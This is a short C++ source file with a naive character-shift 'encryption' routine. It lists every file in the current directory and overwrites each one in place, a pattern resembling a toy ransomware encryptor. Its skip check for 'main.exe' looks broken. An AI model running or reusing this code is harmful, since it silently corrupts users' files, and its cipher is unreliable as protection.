
#include "CPP/header/encript.h"
#include <filesystem>
#include <fstream>

char replaceChar(char c, int numpush) { return c - numpush; }

int revertKey(const std::string &s) {
  std::string key;
  int num = 2;
  for (char i : s) {
    key += i + static_cast<char>(num);
  }
  return key[0] + key[1];
}

void encryptFiles(const std::vector<std::string> &files, int key) {
  for (const std::string &s : files) {
    std::ifstream input(s);
    if (!input)
      continue;

    std::vector<std::string> strings;
    std::string line;
    while (getline(input, line)) {
      for (char &i : line) {
        i = replaceChar(i, key);
      }
      strings.push_back(line);
    }

    std::ofstream output(s);
    for (const auto &str : strings) {
      output << str << '\n';
    }
  }
}

std::vector<std::string> readFile() {
  std::vector<std::string> files;
  for (const auto &entry : std::filesystem::directory_iterator(".")) {
    if (entry.path().string() == "main.exe")
      continue;
    files.push_back(entry.path().string());
  }
  return files;
}
